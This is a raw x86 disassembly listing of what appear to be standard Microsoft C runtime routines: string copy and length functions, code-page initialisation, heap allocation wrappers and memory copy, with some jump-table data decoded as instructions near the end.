  423dfa:	mov    WORD PTR [edi],dx
  423dfd:	mov    eax,DWORD PTR [esp+0x8]
  423e01:	mov    BYTE PTR [edi+0x2],0x0
  423e05:	pop    edi
  423e06:	ret    
  423e07:	mov    WORD PTR [edi],dx
  423e0a:	mov    eax,DWORD PTR [esp+0x8]
  423e0e:	pop    edi
  423e0f:	ret    
  423e10:	mov    BYTE PTR [edi],dl
  423e12:	mov    eax,DWORD PTR [esp+0x8]
  423e16:	pop    edi
  423e17:	ret    
  423e18:	int3   
  423e19:	int3   
  423e1a:	int3   
  423e1b:	int3   
  423e1c:	int3   
  423e1d:	int3   
  423e1e:	int3   
  423e1f:	int3   
  423e20:	mov    ecx,DWORD PTR [esp+0xc]
  423e24:	push   edi
  423e25:	test   ecx,ecx
  423e27:	je     0x423ebf
  423e2d:	push   esi
  423e2e:	push   ebx
  423e2f:	mov    ebx,ecx
  423e31:	mov    esi,DWORD PTR [esp+0x14]
  423e35:	test   esi,0x3
  423e3b:	mov    edi,DWORD PTR [esp+0x10]
  423e3f:	jne    0x423e4c
  423e41:	shr    ecx,0x2
  423e44:	jne    0x423ecf
  423e4a:	jmp    0x423e73
  423e4c:	mov    al,BYTE PTR [esi]
  423e4e:	add    esi,0x1
  423e51:	mov    BYTE PTR [edi],al
  423e53:	add    edi,0x1
  423e56:	sub    ecx,0x1
  423e59:	je     0x423e86
  423e5b:	test   al,al
  423e5d:	je     0x423e8e
  423e5f:	test   esi,0x3
  423e65:	jne    0x423e4c
  423e67:	mov    ebx,ecx
  423e69:	shr    ecx,0x2
  423e6c:	jne    0x423ecf
  423e6e:	and    ebx,0x3
  423e71:	je     0x423e86
  423e73:	mov    al,BYTE PTR [esi]
  423e75:	add    esi,0x1
  423e78:	mov    BYTE PTR [edi],al
  423e7a:	add    edi,0x1
  423e7d:	test   al,al
  423e7f:	je     0x423eb8
  423e81:	sub    ebx,0x1
  423e84:	jne    0x423e73
  423e86:	mov    eax,DWORD PTR [esp+0x10]
  423e8a:	pop    ebx
  423e8b:	pop    esi
  423e8c:	pop    edi
  423e8d:	ret    
  423e8e:	test   edi,0x3
  423e94:	je     0x423eac
  423e96:	mov    BYTE PTR [edi],al
  423e98:	add    edi,0x1
  423e9b:	sub    ecx,0x1
  423e9e:	je     0x423f3c
  423ea4:	test   edi,0x3
  423eaa:	jne    0x423e96
  423eac:	mov    ebx,ecx
  423eae:	shr    ecx,0x2
  423eb1:	jne    0x423f27
  423eb3:	mov    BYTE PTR [edi],al
  423eb5:	add    edi,0x1
  423eb8:	sub    ebx,0x1
  423ebb:	jne    0x423eb3
  423ebd:	pop    ebx
  423ebe:	pop    esi
  423ebf:	mov    eax,DWORD PTR [esp+0x8]
  423ec3:	pop    edi
  423ec4:	ret    
  423ec5:	mov    DWORD PTR [edi],edx
  423ec7:	add    edi,0x4
  423eca:	sub    ecx,0x1
  423ecd:	je     0x423e6e
  423ecf:	mov    edx,0x7efefeff
  423ed4:	mov    eax,DWORD PTR [esi]
  423ed6:	add    edx,eax
  423ed8:	xor    eax,0xffffffff
  423edb:	xor    eax,edx
  423edd:	mov    edx,DWORD PTR [esi]
  423edf:	add    esi,0x4
  423ee2:	test   eax,0x81010100
  423ee7:	je     0x423ec5
  423ee9:	test   dl,dl
  423eeb:	je     0x423f19
  423eed:	test   dh,dh
  423eef:	je     0x423f0f
  423ef1:	test   edx,0xff0000
  423ef7:	je     0x423f05
  423ef9:	test   edx,0xff000000
  423eff:	jne    0x423ec5
  423f01:	mov    DWORD PTR [edi],edx
  423f03:	jmp    0x423f1d
  423f05:	and    edx,0xffff
  423f0b:	mov    DWORD PTR [edi],edx
  423f0d:	jmp    0x423f1d
  423f0f:	and    edx,0xff
  423f15:	mov    DWORD PTR [edi],edx
  423f17:	jmp    0x423f1d
  423f19:	xor    edx,edx
  423f1b:	mov    DWORD PTR [edi],edx
  423f1d:	add    edi,0x4
  423f20:	xor    eax,eax
  423f22:	sub    ecx,0x1
  423f25:	je     0x423f33
  423f27:	xor    eax,eax
  423f29:	mov    DWORD PTR [edi],eax
  423f2b:	add    edi,0x4
  423f2e:	sub    ecx,0x1
  423f31:	jne    0x423f29
  423f33:	and    ebx,0x3
  423f36:	jne    0x423eb3
  423f3c:	mov    eax,DWORD PTR [esp+0x10]
  423f40:	pop    ebx
  423f41:	pop    esi
  423f42:	pop    edi
  423f43:	ret    
  423f44:	int3   
  423f45:	int3   
  423f46:	int3   
  423f47:	int3   
  423f48:	int3   
  423f49:	int3   
  423f4a:	int3   
  423f4b:	int3   
  423f4c:	int3   
  423f4d:	int3   
  423f4e:	int3   
  423f4f:	int3   
  423f50:	mov    ecx,DWORD PTR [esp+0x4]
  423f54:	test   ecx,0x3
  423f5a:	je     0x423f80
  423f5c:	mov    al,BYTE PTR [ecx]
  423f5e:	add    ecx,0x1
  423f61:	test   al,al
  423f63:	je     0x423fb3
  423f65:	test   ecx,0x3
  423f6b:	jne    0x423f5c
  423f6d:	add    eax,0x0
  423f72:	lea    esp,[esp+0x0]
  423f79:	lea    esp,[esp+0x0]
  423f80:	mov    eax,DWORD PTR [ecx]
  423f82:	mov    edx,0x7efefeff
  423f87:	add    edx,eax
  423f89:	xor    eax,0xffffffff
  423f8c:	xor    eax,edx
  423f8e:	add    ecx,0x4
  423f91:	test   eax,0x81010100
  423f96:	je     0x423f80
  423f98:	mov    eax,DWORD PTR [ecx-0x4]
  423f9b:	test   al,al
  423f9d:	je     0x423fd1
  423f9f:	test   ah,ah
  423fa1:	je     0x423fc7
  423fa3:	test   eax,0xff0000
  423fa8:	je     0x423fbd
  423faa:	test   eax,0xff000000
  423faf:	je     0x423fb3
  423fb1:	jmp    0x423f80
  423fb3:	lea    eax,[ecx-0x1]
  423fb6:	mov    ecx,DWORD PTR [esp+0x4]
  423fba:	sub    eax,ecx
  423fbc:	ret    
  423fbd:	lea    eax,[ecx-0x2]
  423fc0:	mov    ecx,DWORD PTR [esp+0x4]
  423fc4:	sub    eax,ecx
  423fc6:	ret    
  423fc7:	lea    eax,[ecx-0x3]
  423fca:	mov    ecx,DWORD PTR [esp+0x4]
  423fce:	sub    eax,ecx
  423fd0:	ret    
  423fd1:	lea    eax,[ecx-0x4]
  423fd4:	mov    ecx,DWORD PTR [esp+0x4]
  423fd8:	sub    eax,ecx
  423fda:	ret    
  423fdb:	push   0x8
  423fdd:	push   0x428580
  423fe2:	call   0x423940
  423fe7:	and    DWORD PTR [ebp-0x4],0x0
  423feb:	push   0x0
  423fed:	push   0x1
  423fef:	call   0x425b62
  423ff4:	pop    ecx
  423ff5:	pop    ecx
  423ff6:	jmp    0x423fff
  423ff8:	xor    eax,eax
  423ffa:	inc    eax
  423ffb:	ret    
  423ffc:	mov    esp,DWORD PTR [ebp-0x18]
  423fff:	or     DWORD PTR [ebp-0x4],0xffffffff
  424003:	push   0x3
  424005:	call   DWORD PTR ds:0x428060
  42400b:	int3   
  42400c:	cmp    ecx,DWORD PTR ds:0x45f510
  424012:	jne    0x424015
  424014:	ret    
  424015:	jmp    0x423fdb
  42401a:	movzx  eax,BYTE PTR [esp+0x4]
  42401f:	mov    cl,BYTE PTR [esp+0xc]
  424023:	test   BYTE PTR [eax+0x460001],cl
  424029:	jne    0x424047
  42402b:	cmp    DWORD PTR [esp+0x8],0x0
  424030:	je     0x424040
  424032:	movzx  eax,WORD PTR [eax*2+0x42897a]
  42403a:	and    eax,DWORD PTR [esp+0x8]
  42403e:	jmp    0x424042
  424040:	xor    eax,eax
  424042:	test   eax,eax
  424044:	jne    0x424047
  424046:	ret    
  424047:	xor    eax,eax
  424049:	inc    eax
  42404a:	ret    
  42404b:	push   0x4
  42404d:	push   0x0
  42404f:	push   DWORD PTR [esp+0xc]
  424053:	call   0x42401a
  424058:	add    esp,0xc
  42405b:	ret    
  42405c:	sub    eax,0x3a4
  424061:	je     0x424085
  424063:	sub    eax,0x4
  424066:	je     0x42407f
  424068:	sub    eax,0xd
  42406b:	je     0x424079
  42406d:	dec    eax
  42406e:	je     0x424073
  424070:	xor    eax,eax
  424072:	ret    
  424073:	mov    eax,0x404
  424078:	ret    
  424079:	mov    eax,0x412
  42407e:	ret    
  42407f:	mov    eax,0x804
  424084:	ret    
  424085:	mov    eax,0x411
  42408a:	ret    
  42408b:	push   edi
  42408c:	push   0x40
  42408e:	xor    eax,eax
  424090:	pop    ecx
  424091:	mov    edi,0x460000
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	stos   BYTE PTR es:[edi],al
  424099:	xor    eax,eax
  42409b:	mov    ds:0x460104,eax
  4240a0:	mov    ds:0x45fffc,eax
  4240a5:	mov    ds:0x45fff4,eax
  4240aa:	mov    edi,0x460110
  4240af:	stos   DWORD PTR es:[edi],eax
  4240b0:	stos   DWORD PTR es:[edi],eax
  4240b1:	stos   DWORD PTR es:[edi],eax
  4240b2:	pop    edi
  4240b3:	ret    
  4240b4:	push   ebp
  4240b5:	mov    ebp,esp
  4240b7:	sub    esp,0x518
  4240bd:	mov    eax,ds:0x45f510
  4240c2:	xor    eax,DWORD PTR [ebp+0x4]
  4240c5:	push   esi
  4240c6:	mov    DWORD PTR [ebp-0x4],eax
  4240c9:	lea    eax,[ebp-0x18]
  4240cc:	push   eax
  4240cd:	push   DWORD PTR ds:0x460104
  4240d3:	call   DWORD PTR ds:0x4280d4
  4240d9:	cmp    eax,0x1
  4240dc:	mov    esi,0x100
  4240e1:	jne    0x4241f4
  4240e7:	xor    eax,eax
  4240e9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  4240f0:	inc    eax
  4240f1:	cmp    eax,esi
  4240f3:	jb     0x4240e9
  4240f5:	mov    al,BYTE PTR [ebp-0x12]
  4240f8:	test   al,al
  4240fa:	mov    BYTE PTR [ebp-0x118],0x20
  424101:	je     0x424139
  424103:	push   ebx
  424104:	lea    edx,[ebp-0x11]
  424107:	push   edi
  424108:	movzx  ecx,BYTE PTR [edx]
  42410b:	movzx  eax,al
  42410e:	cmp    eax,ecx
  424110:	ja     0x42412f
  424112:	sub    ecx,eax
  424114:	inc    ecx
  424115:	mov    ebx,ecx
  424117:	shr    ecx,0x2
  42411a:	lea    edi,[ebp+eax*1-0x118]
  424121:	mov    eax,0x20202020
  424126:	rep stos DWORD PTR es:[edi],eax
  424128:	mov    ecx,ebx
  42412a:	and    ecx,0x3
  42412d:	rep stos BYTE PTR es:[edi],al
  42412f:	inc    edx
  424130:	mov    al,BYTE PTR [edx]
  424132:	inc    edx
  424133:	test   al,al
  424135:	jne    0x424108
  424137:	pop    edi
  424138:	pop    ebx
  424139:	push   0x0
  42413b:	push   DWORD PTR ds:0x45fff4
  424141:	lea    eax,[ebp-0x518]
  424147:	push   DWORD PTR ds:0x460104
  42414d:	push   eax
  42414e:	push   esi
  42414f:	lea    eax,[ebp-0x118]
  424155:	push   eax
  424156:	push   0x1
  424158:	call   0x426068
  42415d:	push   0x0
  42415f:	push   DWORD PTR ds:0x460104
  424165:	lea    eax,[ebp-0x218]
  42416b:	push   esi
  42416c:	push   eax
  42416d:	push   esi
  42416e:	lea    eax,[ebp-0x118]
  424174:	push   eax
  424175:	push   esi
  424176:	push   DWORD PTR ds:0x45fff4
  42417c:	call   0x425cac
  424181:	push   0x0
  424183:	push   DWORD PTR ds:0x460104
  424189:	lea    eax,[ebp-0x318]
  42418f:	push   esi
  424190:	push   eax
  424191:	push   esi
  424192:	lea    eax,[ebp-0x118]
  424198:	push   eax
  424199:	push   0x200
  42419e:	push   DWORD PTR ds:0x45fff4
  4241a4:	call   0x425cac
  4241a9:	add    esp,0x5c
  4241ac:	xor    eax,eax
  4241ae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4241b6:	test   cl,0x1
  4241b9:	je     0x4241d1
  4241bb:	or     BYTE PTR [eax+0x460001],0x10
  4241c2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4241c9:	mov    BYTE PTR [eax+0x460120],cl
  4241cf:	jmp    0x4241ed
  4241d1:	test   cl,0x2
  4241d4:	je     0x4241e6
  4241d6:	or     BYTE PTR [eax+0x460001],0x20
  4241dd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  4241e4:	jmp    0x4241c9
  4241e6:	and    BYTE PTR [eax+0x460120],0x0
  4241ed:	inc    eax
  4241ee:	cmp    eax,esi
  4241f0:	jb     0x4241ae
  4241f2:	jmp    0x424238
  4241f4:	xor    eax,eax
  4241f6:	cmp    eax,0x41
  4241f9:	jb     0x424214
  4241fb:	cmp    eax,0x5a
  4241fe:	ja     0x424214
  424200:	or     BYTE PTR [eax+0x460001],0x10
  424207:	mov    cl,al
  424209:	add    cl,0x20
  42420c:	mov    BYTE PTR [eax+0x460120],cl
  424212:	jmp    0x424233
  424214:	cmp    eax,0x61
  424217:	jb     0x42422c
  424219:	cmp    eax,0x7a
  42421c:	ja     0x42422c
  42421e:	or     BYTE PTR [eax+0x460001],0x20
  424225:	mov    cl,al
  424227:	sub    cl,0x20
  42422a:	jmp    0x42420c
  42422c:	and    BYTE PTR [eax+0x460120],0x0
  424233:	inc    eax
  424234:	cmp    eax,esi
  424236:	jb     0x4241f6
  424238:	mov    ecx,DWORD PTR [ebp-0x4]
  42423b:	xor    ecx,DWORD PTR [ebp+0x4]
  42423e:	pop    esi
  42423f:	call   0x42400c
  424244:	leave  
  424245:	ret    
  424246:	push   ebp
  424247:	mov    ebp,esp
  424249:	sub    esp,0x1c
  42424c:	mov    eax,ds:0x45f510
  424251:	xor    eax,DWORD PTR [ebp+0x4]
  424254:	push   ebx
  424255:	push   esi
  424256:	mov    esi,DWORD PTR [ebp+0x8]
  424259:	xor    ebx,ebx
  42425b:	cmp    esi,ebx
  42425d:	mov    DWORD PTR [ebp-0x4],eax
  424260:	push   edi
  424261:	je     0x4243bb
  424267:	xor    edx,edx
  424269:	xor    eax,eax
  42426b:	cmp    DWORD PTR [eax+0x45f520],esi
  424271:	je     0x4242d8
  424273:	add    eax,0x30
  424276:	inc    edx
  424277:	cmp    eax,0xf0
  42427c:	jb     0x42426b
  42427e:	lea    eax,[ebp-0x1c]
  424281:	push   eax
  424282:	push   esi
  424283:	call   DWORD PTR ds:0x4280d4
  424289:	cmp    eax,0x1
  42428c:	jne    0x4243b3
  424292:	push   0x40
  424294:	xor    eax,eax
  424296:	cmp    DWORD PTR [ebp-0x1c],0x1
  42429a:	pop    ecx
  42429b:	mov    edi,0x460000
  4242a0:	rep stos DWORD PTR es:[edi],eax
  4242a2:	stos   BYTE PTR es:[edi],al
  4242a3:	mov    DWORD PTR ds:0x460104,esi
  4242a9:	mov    DWORD PTR ds:0x45fff4,ebx
  4242af:	jbe    0x4243a1
  4242b5:	cmp    BYTE PTR [ebp-0x16],0x0
  4242b9:	je     0x424379
  4242bf:	lea    ecx,[ebp-0x15]
  4242c2:	mov    dl,BYTE PTR [ecx]
  4242c4:	test   dl,dl
  4242c6:	je     0x424379
  4242cc:	movzx  eax,BYTE PTR [ecx-0x1]
  4242d0:	movzx  edx,dl
  4242d3:	jmp    0x424369
  4242d8:	push   0x40
  4242da:	xor    eax,eax
  4242dc:	pop    ecx
  4242dd:	mov    edi,0x460000
  4242e2:	rep stos DWORD PTR es:[edi],eax
  4242e4:	lea    ecx,[edx+edx*2]
  4242e7:	shl    ecx,0x4
  4242ea:	mov    DWORD PTR [ebp-0x8],ebx
  4242ed:	stos   BYTE PTR es:[edi],al
  4242ee:	lea    ebx,[ecx+0x45f530]
  4242f4:	mov    al,BYTE PTR [ebx]
  4242f6:	mov    esi,ebx
  4242f8:	jmp    0x424323
  4242fa:	mov    dl,BYTE PTR [esi+0x1]
  4242fd:	test   dl,dl
  4242ff:	je     0x424327
  424301:	movzx  eax,al
  424304:	movzx  edi,dl
  424307:	cmp    eax,edi
  424309:	ja     0x42431f
  42430b:	mov    edx,DWORD PTR [ebp-0x8]
  42430e:	mov    dl,BYTE PTR [edx+0x45f518]
  424314:	or     BYTE PTR [eax+0x460001],dl
  42431a:	inc    eax
  42431b:	cmp    eax,edi
  42431d:	jbe    0x424314
  42431f:	inc    esi
  424320:	inc    esi
  424321:	mov    al,BYTE PTR [esi]
  424323:	test   al,al
  424325:	jne    0x4242fa
  424327:	inc    DWORD PTR [ebp-0x8]
  42432a:	add    ebx,0x8
  42432d:	cmp    DWORD PTR [ebp-0x8],0x4
  424331:	jb     0x4242f4
  424333:	mov    eax,DWORD PTR [ebp+0x8]
  424336:	mov    ds:0x460104,eax
  42433b:	mov    DWORD PTR ds:0x45fffc,0x1
  424345:	call   0x42405c
  42434a:	lea    ecx,[ecx+0x45f524]
  424350:	mov    esi,ecx
  424352:	mov    edi,0x460110
  424357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424359:	mov    ds:0x45fff4,eax
  42435e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42435f:	jmp    0x4243c0
  424361:	or     BYTE PTR [eax+0x460001],0x4
  424368:	inc    eax
  424369:	cmp    eax,edx
  42436b:	jbe    0x424361
  42436d:	inc    ecx
  42436e:	inc    ecx
  42436f:	cmp    BYTE PTR [ecx-0x1],0x0
  424373:	jne    0x4242c2
  424379:	xor    ecx,ecx
  42437b:	inc    ecx
  42437c:	mov    eax,ecx
  42437e:	or     BYTE PTR [eax+0x460001],0x8
  424385:	inc    eax
  424386:	cmp    eax,0xff
  42438b:	jb     0x42437e
  42438d:	mov    eax,esi
  42438f:	call   0x42405c
  424394:	mov    ds:0x45fff4,eax
  424399:	mov    DWORD PTR ds:0x45fffc,ecx
  42439f:	jmp    0x4243a7
  4243a1:	mov    DWORD PTR ds:0x45fffc,ebx
  4243a7:	xor    eax,eax
  4243a9:	mov    edi,0x460110
  4243ae:	stos   DWORD PTR es:[edi],eax
  4243af:	stos   DWORD PTR es:[edi],eax
  4243b0:	stos   DWORD PTR es:[edi],eax
  4243b1:	jmp    0x4243c0
  4243b3:	cmp    DWORD PTR ds:0x45fe64,ebx
  4243b9:	je     0x4243c9
  4243bb:	call   0x42408b
  4243c0:	call   0x4240b4
  4243c5:	xor    eax,eax
  4243c7:	jmp    0x4243cc
  4243c9:	or     eax,0xffffffff
  4243cc:	mov    ecx,DWORD PTR [ebp-0x4]
  4243cf:	xor    ecx,DWORD PTR [ebp+0x4]
  4243d2:	pop    edi
  4243d3:	pop    esi
  4243d4:	pop    ebx
  4243d5:	call   0x42400c
  4243da:	leave  
  4243db:	ret    
  4243dc:	push   0x14
  4243de:	push   0x428590
  4243e3:	call   0x423940
  4243e8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4243ec:	push   0xd
  4243ee:	call   0x423aff
  4243f3:	pop    ecx
  4243f4:	xor    edi,edi
  4243f6:	mov    DWORD PTR [ebp-0x4],edi
  4243f9:	mov    DWORD PTR ds:0x45fe64,edi
  4243ff:	mov    eax,DWORD PTR [ebp+0x8]
  424402:	cmp    eax,0xfffffffe
  424405:	jne    0x424419
  424407:	mov    DWORD PTR ds:0x45fe64,0x1
  424411:	call   DWORD PTR ds:0x4280d0
  424417:	jmp    0x424444
  424419:	cmp    eax,0xfffffffd
  42441c:	jne    0x424430
  42441e:	mov    DWORD PTR ds:0x45fe64,0x1
  424428:	call   DWORD PTR ds:0x4280cc
  42442e:	jmp    0x424444
  424430:	cmp    eax,0xfffffffc
  424433:	jne    0x424444
  424435:	mov    DWORD PTR ds:0x45fe64,0x1
  42443f:	mov    eax,ds:0x45fe94
  424444:	mov    DWORD PTR [ebp+0x8],eax
  424447:	cmp    eax,DWORD PTR ds:0x460104
  42444d:	je     0x42450e
  424453:	mov    esi,DWORD PTR ds:0x45fff8
  424459:	mov    DWORD PTR [ebp-0x20],esi
  42445c:	cmp    esi,edi
  42445e:	je     0x424464
  424460:	cmp    DWORD PTR [esi],edi
  424462:	je     0x424474
  424464:	push   0x220
  424469:	call   0x424662
  42446e:	pop    ecx
  42446f:	mov    esi,eax
  424471:	mov    DWORD PTR [ebp-0x20],esi
  424474:	cmp    esi,edi
  424476:	je     0x4244f7
  424478:	push   DWORD PTR [ebp+0x8]
  42447b:	call   0x424246
  424480:	pop    ecx
  424481:	mov    DWORD PTR [ebp-0x1c],eax
  424484:	cmp    eax,edi
  424486:	jne    0x4244f7
  424488:	mov    DWORD PTR [esi],edi
  42448a:	mov    eax,ds:0x460104
  42448f:	mov    DWORD PTR [esi+0x4],eax
  424492:	mov    eax,ds:0x45fffc
  424497:	mov    DWORD PTR [esi+0x8],eax
  42449a:	mov    eax,ds:0x45fff4
  42449f:	mov    DWORD PTR [esi+0xc],eax
  4244a2:	xor    eax,eax
  4244a4:	mov    DWORD PTR [ebp-0x24],eax
  4244a7:	cmp    eax,0x5
  4244aa:	jge    0x4244bc
  4244ac:	mov    cx,WORD PTR [eax*2+0x460110]
  4244b4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4244b9:	inc    eax
  4244ba:	jmp    0x4244a4
  4244bc:	xor    eax,eax
  4244be:	mov    DWORD PTR [ebp-0x24],eax
  4244c1:	cmp    eax,0x101
  4244c6:	jge    0x4244d5
  4244c8:	mov    cl,BYTE PTR [eax+0x460000]
  4244ce:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4244d2:	inc    eax
  4244d3:	jmp    0x4244be
  4244d5:	xor    eax,eax
  4244d7:	mov    DWORD PTR [ebp-0x24],eax
  4244da:	cmp    eax,0x100
  4244df:	jge    0x4244f1
  4244e1:	mov    cl,BYTE PTR [eax+0x460120]
  4244e7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  4244ee:	inc    eax
  4244ef:	jmp    0x4244d7
  4244f1:	mov    DWORD PTR ds:0x45fff8,esi
  4244f7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4244fb:	jne    0x424511
  4244fd:	cmp    esi,DWORD PTR ds:0x45fff8
  424503:	je     0x424511
  424505:	push   esi
  424506:	call   0x42454a
  42450b:	pop    ecx
  42450c:	jmp    0x424511
  42450e:	mov    DWORD PTR [ebp-0x1c],edi
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x424523
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	call   0x42397b
  424522:	ret    
  424523:	push   0xd
  424525:	call   0x423a6b
  42452a:	pop    ecx
  42452b:	ret    
  42452c:	cmp    DWORD PTR ds:0x46034c,0x0
  424533:	jne    0x424547
  424535:	push   0xfffffffd
  424537:	call   0x4243dc
  42453c:	pop    ecx
  42453d:	mov    DWORD PTR ds:0x46034c,0x1
  424547:	xor    eax,eax
  424549:	ret    
  42454a:	push   0xc
  42454c:	push   0x4285a0
  424551:	call   0x423940
  424556:	mov    esi,DWORD PTR [ebp+0x8]
  424559:	test   esi,esi
  42455b:	je     0x4245b5
  42455d:	cmp    DWORD PTR ds:0x460224,0x3
  424564:	jne    0x4245a6
  424566:	push   0x4
  424568:	call   0x423aff
  42456d:	pop    ecx
  42456e:	and    DWORD PTR [ebp-0x4],0x0
  424572:	push   esi
  424573:	call   0x424d22
  424578:	pop    ecx
  424579:	mov    DWORD PTR [ebp-0x1c],eax
  42457c:	test   eax,eax
  42457e:	je     0x424589
  424580:	push   esi
  424581:	push   eax
  424582:	call   0x424d4d
  424587:	pop    ecx
  424588:	pop    ecx
  424589:	or     DWORD PTR [ebp-0x4],0xffffffff
  42458d:	call   0x42459d
  424592:	cmp    DWORD PTR [ebp-0x1c],0x0
  424596:	jne    0x4245b5
  424598:	push   DWORD PTR [ebp+0x8]
  42459b:	jmp    0x4245a7
  42459d:	push   0x4
  42459f:	call   0x423a6b
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	push   esi
  4245a7:	push   0x0
  4245a9:	push   DWORD PTR ds:0x460220
  4245af:	call   DWORD PTR ds:0x4280c0
  4245b5:	call   0x42397b
  4245ba:	ret    
  4245bb:	push   0xc
  4245bd:	push   0x4285b0
  4245c2:	call   0x423940
  4245c7:	mov    esi,DWORD PTR [ebp+0x8]
  4245ca:	cmp    DWORD PTR ds:0x460224,0x3
  4245d1:	jne    0x424601
  4245d3:	cmp    esi,DWORD PTR ds:0x45ffe4
  4245d9:	ja     0x424601
  4245db:	push   0x4
  4245dd:	call   0x423aff
  4245e2:	pop    ecx
  4245e3:	and    DWORD PTR [ebp-0x4],0x0
  4245e7:	push   esi
  4245e8:	call   0x425501
  4245ed:	pop    ecx
  4245ee:	mov    DWORD PTR [ebp-0x1c],eax
  4245f1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4245f5:	call   0x42462d
  4245fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4245fd:	test   eax,eax
  4245ff:	jne    0x424624
  424601:	test   esi,esi
  424603:	jne    0x424606
  424605:	inc    esi
  424606:	cmp    DWORD PTR ds:0x460224,0x1
  42460d:	je     0x424615
  42460f:	add    esi,0xf
  424612:	and    esi,0xfffffff0
  424615:	push   esi
  424616:	push   0x0
  424618:	push   DWORD PTR ds:0x460220
  42461e:	call   DWORD PTR ds:0x4280d8
  424624:	call   0x42397b
  424629:	ret    
  42462a:	mov    esi,DWORD PTR [ebp+0x8]
  42462d:	push   0x4
  42462f:	call   0x423a6b
  424634:	pop    ecx
  424635:	ret    
  424636:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42463b:	ja     0x42465f
  42463d:	push   DWORD PTR [esp+0x4]
  424641:	call   0x4245bb
  424646:	test   eax,eax
  424648:	pop    ecx
  424649:	jne    0x424661
  42464b:	cmp    DWORD PTR [esp+0x8],eax
  42464f:	je     0x424661
  424651:	push   DWORD PTR [esp+0x4]
  424655:	call   0x426222
  42465a:	test   eax,eax
  42465c:	pop    ecx
  42465d:	jne    0x42463d
  42465f:	xor    eax,eax
  424661:	ret    
  424662:	push   DWORD PTR ds:0x45fea8
  424668:	push   DWORD PTR [esp+0x8]
  42466c:	call   0x424636
  424671:	pop    ecx
  424672:	pop    ecx
  424673:	ret    
  424674:	int3   
  424675:	int3   
  424676:	int3   
  424677:	int3   
  424678:	int3   
  424679:	int3   
  42467a:	int3   
  42467b:	int3   
  42467c:	int3   
  42467d:	int3   
  42467e:	int3   
  42467f:	int3   
  424680:	push   ebp
  424681:	mov    ebp,esp
  424683:	push   edi
  424684:	push   esi
  424685:	mov    esi,DWORD PTR [ebp+0xc]
  424688:	mov    ecx,DWORD PTR [ebp+0x10]
  42468b:	mov    edi,DWORD PTR [ebp+0x8]
  42468e:	mov    eax,ecx
  424690:	mov    edx,ecx
  424692:	add    eax,esi
  424694:	cmp    edi,esi
  424696:	jbe    0x4246a0
  424698:	cmp    edi,eax
  42469a:	jb     0x42481c
  4246a0:	test   edi,0x3
  4246a6:	jne    0x4246bc
  4246a8:	shr    ecx,0x2
  4246ab:	and    edx,0x3
  4246ae:	cmp    ecx,0x8
  4246b1:	jb     0x4246dc
  4246b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246b5:	jmp    DWORD PTR [edx*4+0x4247cc]
  4246bc:	mov    eax,edi
  4246be:	mov    edx,0x3
  4246c3:	sub    ecx,0x4
  4246c6:	jb     0x4246d4
  4246c8:	and    eax,0x3
  4246cb:	add    ecx,eax
  4246cd:	jmp    DWORD PTR [eax*4+0x4246e0]
  4246d4:	jmp    DWORD PTR [ecx*4+0x4247dc]
  4246db:	nop
  4246dc:	jmp    DWORD PTR [ecx*4+0x424760]
  4246e3:	nop
  4246e4:	lock inc esi
  4246e6:	inc    edx
  4246e7:	add    BYTE PTR [edi+eax*2],bl
  4246ea:	inc    edx
  4246eb:	add    BYTE PTR [eax+0x47],al
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx],ah
  4246f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4246f7:	inc    esi
  4246f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4246fe:	add    al,cl
  424700:	jmp    0x289cf07
  424705:	add    esi,0x3
  424708:	add    edi,0x3
  42470b:	cmp    ecx,0x8
  42470e:	jb     0x4246dc
  424710:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424712:	jmp    DWORD PTR [edx*4+0x4247cc]
  424719:	lea    ecx,[ecx+0x0]
  42471c:	and    edx,ecx
  42471e:	mov    al,BYTE PTR [esi]
  424720:	mov    BYTE PTR [edi],al
  424722:	mov    al,BYTE PTR [esi+0x1]
  424725:	shr    ecx,0x2
  424728:	mov    BYTE PTR [edi+0x1],al
  42472b:	add    esi,0x2
  42472e:	add    edi,0x2
  424731:	cmp    ecx,0x8
  424734:	jb     0x4246dc
  424736:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424738:	jmp    DWORD PTR [edx*4+0x4247cc]
  42473f:	nop
  424740:	and    edx,ecx
  424742:	mov    al,BYTE PTR [esi]
  424744:	mov    BYTE PTR [edi],al
  424746:	add    esi,0x1
  424749:	shr    ecx,0x2
  42474c:	add    edi,0x1
  42474f:	cmp    ecx,0x8
  424752:	jb     0x4246dc
  424754:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424756:	jmp    DWORD PTR [edx*4+0x4247cc]
  42475d:	lea    ecx,[ecx+0x0]
  424760:	ret    
  424761:	inc    edi
  424762:	inc    edx
  424763:	add    BYTE PTR [eax-0x57ffbdb9],dh
  424769:	inc    edi
  42476a:	inc    edx
  42476b:	add    BYTE PTR [eax-0x67ffbdb9],ah
  424771:	inc    edi
  424772:	inc    edx
  424773:	add    BYTE PTR [eax-0x77ffbdb9],dl
  424779:	inc    edi
  42477a:	inc    edx
  42477b:	add    BYTE PTR [eax-0x74ffbdb9],al
  424781:	inc    esp
  424782:	mov    fs,esp
  424784:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
